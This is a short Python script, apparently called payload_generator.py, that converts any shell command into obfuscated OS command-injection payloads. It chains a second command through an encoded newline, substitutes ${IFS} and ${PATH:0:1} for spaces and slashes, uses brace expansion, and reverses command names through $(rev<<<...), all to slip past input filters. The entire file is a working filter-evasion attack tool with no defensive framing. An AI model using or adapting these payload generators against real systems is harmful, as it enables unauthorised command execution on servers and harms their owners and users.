import shlex
import sys

def escape_path(path: str) -> str:
    """Replace '/' in path with ${PATH:0:1}."""
    parts = path.split('/')
    rebuilt = parts[0]
    for part in parts[1:]:
        rebuilt += "${PATH:0:1}" + part
    return rebuilt

def variant1(tokens):
    """Variant 1: direct command (brace-expansion if flags exist)."""
    cmd = tokens[0]
    flags = ''.join(tok for tok in tokens[1:] if tok.startswith('-'))
    args = [tok for tok in tokens[1:] if not tok.startswith('-')]

    payload = "${LS_COLORS:10:1}%0a"
    if flags:
        payload += f"{{{cmd},{flags}}}"
    else:
        payload += cmd

    sep = "${IFS}"
    for arg in args:
        payload += sep + escape_path(arg)
    return payload

def variant2(tokens):
    """Variant 2: rev hack for each non-path token."""
    payload = "${LS_COLORS:10:1}%0a"
    sep = "${IFS}"
    for tok in tokens:
        if tok.startswith('/'):
            # path
            payload += sep + escape_path(tok)
        else:
            # command or flag
            rev = tok[::-1]
            payload += (sep if payload.endswith("%0a") == False else "") + f"$(rev<<<'{rev}')"
    return payload

def generate_variants(command: str):
    tokens = shlex.split(command)
    if not tokens:
        return "", ""
    v1 = variant1(tokens)
    v2 = variant2(tokens)
    return v1, v2

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python payload_generator.py \"<shell command>\"")
        sys.exit(1)
    cmd = " ".join(sys.argv[1:])
    v1, v2 = generate_variants(cmd)
    print(f"Variant 1: {v1}")
    print(f"Variant 2: {v2}")
